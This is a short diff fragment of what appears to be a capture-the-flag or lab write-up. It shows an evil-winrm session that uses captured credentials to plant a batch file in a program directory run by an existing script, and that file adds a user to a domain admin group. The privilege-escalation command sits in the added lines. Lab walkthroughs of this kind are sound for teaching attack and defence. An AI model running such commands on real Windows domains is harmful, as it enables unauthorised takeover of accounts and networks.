@@ -666,7 +666,11 @@ There is an interesting script in program files
 So if i create my own batch file in the same dir it will run
 
 ```python
-
+evil-winrm-py PS C:\Temp> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {Set-Content -Path "C:\Program Files\keepmeon\DA.bat" -Value 'net group site_admin awallace /add /domain'} -Credential $cred -ConfigurationName dc_manage
 ```
+
+Ill make a batch script to add the current user to the site_admin group
+
+
 
 
